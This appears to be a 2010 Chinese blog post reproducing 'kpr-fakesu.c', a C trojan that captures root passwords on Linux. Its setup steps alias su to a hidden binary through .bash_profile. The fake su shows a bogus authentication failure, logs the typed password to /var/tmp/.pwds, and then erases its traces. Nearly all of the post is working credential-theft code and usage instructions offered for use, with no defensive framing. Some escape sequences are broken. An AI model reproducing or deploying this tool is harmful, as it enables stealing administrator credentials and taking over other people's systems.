title: linux 记录su登陆密码代码
categories: [网络安全,Linux,C编程]
tags: []
date: 2010-08-13 19:17:00
---
/* <br />* kpr-fakesu.c V0.9beta167 ;P<br />* by koper &lt;[email]koper@linuxmail.org[/email]&gt;<br /><em><br /></em> Setting up:<br />* admin@host:~$ gcc -o .su fakesu.c; rm -rf fakesu.c<br />* admin@host:~$ mv .su /var/tmp/.su<br />* admin@host:~$ cp .bash_profile .wgetrc<br />* admin@host:~$ echo &quot;alias su=/var/tmp/.su&quot;&gt;&gt;.bash_profile<br />* admin@host:~$ logout<br />* *** LOGIN **<em><br /></em> admin@host:~$ su<br />* Password: <br />* su: Authentication failure<br />* Sorry.<br />* admin@host:~$ su<br />* Password: <br />* root@host:~# logout<br />* admin@host:~$ cat /var/tmp/.pwds<br />* root:dupcia17<br />* admin@host:~$ <br />* <br />* /bin/su sends various failure information depending on the OS ver.<br />* Please modify the source to make it &quot;fit&quot; ;)<br />* <br />*/<br /><br />#include &lt;stdio.h&gt;<br />#include &lt;stdlib.h&gt;<br />#include &lt;unistd.h&gt;<br /><br />main(int argc, char *argv[]){<br /><br />FILE *fp;<br />char *user;<br />char *pass;<br />char filex[100];<br />char clean[100];<br /><br />sprintf(filex,&quot;/var/tmp/.pwds&quot;);<br />sprintf(clean,&quot;rm -rf /var/tmp/.su;mv -f /home/sichunfeng/.wgetrc /home/sichunfeng/.bash_profile&quot;);<br />if(argc==1) user=&quot;root&quot;;<br />if(argc==2) user=argv[1];<br />if(argc&gt;2){<br />if(strcmp(argv[1], &quot;-l&quot;)==0)<br />user=argv[2];<br />else user=argv[1];}<br /><br />fprintf(stdout,&quot;Password: &quot;); <br />pass=getpass (&quot;&quot;);<br />system(&quot;sleep 3&quot;);<br />fprintf(stdout,&quot;su: Authentication failurenSorry.n&quot;);<br /><br />if ((fp=fopen(filex,&quot;w&quot;)) != NULL)<br />{<br />fprintf(fp, &quot;%s:%sn&quot;, user, pass);<br />fclose(fp);<br />}<br /><br />system(clean);<br />system(&quot;rm -rf /var/tmp/.su; ln -s /bin/su /var/tmp/.su&quot;);<br />}